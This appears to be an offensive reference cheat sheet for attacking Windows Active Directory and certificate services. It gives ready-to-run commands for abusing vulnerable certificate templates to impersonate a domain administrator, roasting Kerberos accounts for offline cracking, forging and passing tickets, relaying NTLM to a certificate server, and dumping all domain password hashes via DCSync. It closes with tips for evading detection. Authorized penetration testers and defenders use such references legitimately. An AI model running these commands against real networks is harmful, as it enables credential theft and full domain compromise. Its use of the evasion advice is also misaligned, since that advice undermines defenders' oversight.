# Network + Active Directory + ADCS Reference

## Domain: Network & AD Attacks

### Key Tools
- **BloodHound / SharpHound** — AD graph enumeration, attack path discovery
- **impacket** — secretsdump, psexec, wmiexec, getTGT, getST, getPac
- **Certipy** — ADCS ESC1-16 enumeration and exploitation
- **Rubeus** — Kerberos ticket operations (AS-REP roast, Kerberoast, S4U, PKINIT)
- **CrackMapExec / NetExec** — SMB/LDAP/WinRM lateral movement and spray
- **Responder / ntlmrelayx** — LLMNR/NBT-NS poisoning, NTLM relay chains
- **PowerView / ADModule** — AD enumeration via PowerShell

---

## ADCS Attack Classes (ESC1–ESC16)

| ESC | Condition | Attack |
|-----|-----------|--------|
| ESC1 | Enrollee supplies SAN, low-priv enrollment | Request cert as any user/DA |
| ESC2 | Any Purpose EKU + enrollee SAN | Flexible cert abuse |
| ESC3 | Enrollment Agent template | Enroll on behalf of any user |
| ESC4 | Write access to template | Modify to add SAN, change EKU |
| ESC6 | EDITF_ATTRIBUTESUBJECTALTNAME2 on CA | Any enrollable template → arbitrary SAN |
| ESC8 | AD CS web enrollment + NTLM relay | Relay DC auth to get DC cert |
| ESC9 | No-security extension on template | CT_FLAG_NO_SECURITY_EXTENSION abuse |
| ESC11 | NTLM relay to ICertPassage RPC | No HTTP needed |
| ESC13 | OID group link on policy | Group membership via issuance policy |
| ESC14 | AltSecurityIdentities write access | Map cert to arbitrary account |
| ESC15 | Schema version 1 templates | Bypass SAN restriction |
| ESC16 | szOID_NTDS_CA_SECURITY_EXT disabled CA-wide | Security extension bypass |

### Certipy Commands
```bash
# Enumerate
certipy find -u user@domain.local -p 'Password1' -dc-ip 10.0.0.1 -vulnerable

# ESC1 — request cert as DA
certipy req -u user@domain.local -p 'Password1' -ca 'CORP-CA' \
  -template VulnTemplate -upn administrator@domain.local -dc-ip 10.0.0.1

# Auth with cert (PKINIT → TGT)
certipy auth -pfx administrator.pfx -domain domain.local -dc-ip 10.0.0.1
```

---

## Kerberos Attacks

### AS-REP Roasting (T1558.004)
```bash
# impacket
GetNPUsers.py domain.local/ -usersfile users.txt -format hashcat -dc-ip 10.0.0.1

# Rubeus
Rubeus.exe asreproast /format:hashcat /outfile:hashes.txt
```

### Kerberoasting (T1558.003)
```bash
# impacket
GetUserSPNs.py domain.local/user:pass -dc-ip 10.0.0.1 -request -outputfile kerb.txt

# Rubeus
Rubeus.exe kerberoast /outfile:hashes.txt /rc4opsec
```

### Pass-the-Ticket (T1550.003)
```bash
Rubeus.exe ptt /ticket:base64blob
```

### Diamond / Sapphire Tickets
```bash
# Diamond ticket (modify existing TGT PAC in-flight)
Rubeus.exe diamond /krbkey:HASH /user:lowpriv /password:pass /enctype:aes256 /ticketuser:administrator
```

### Shadow Credentials (T1649)
```bash
# Certipy
certipy shadow auto -u attacker@domain.local -p 'Pass' -account targetuser -dc-ip 10.0.0.1
```

---

## NTLM Relay Chains

```bash
# Disable SMB signing check targets
crackmapexec smb 10.0.0.0/24 --gen-relay-list relay_targets.txt

# Responder + ntlmrelayx (ESC8 to ADCS)
responder -I eth0 -dwP
ntlmrelayx.py -t http://adcs-server/certsrv/certfnsh.asp -smb2support \
  --adcs --template DomainController
```

---

## DCSync (T1003.006)
```bash
secretsdump.py domain.local/user:pass@dc-ip -just-dc-ntlm
```

## OPSEC Notes
- Kerberoasting RC4 is noisier than AES — use `/rc4opsec` in Rubeus
- DCSync generates 4662 events on DC — avoid during business hours
- ADCS HTTP relay (ESC8) requires no SMB signing bypass — very stealthy
- BloodHound collection: use `--stealth` / `--CollectionMethods DCOnly` to reduce noise
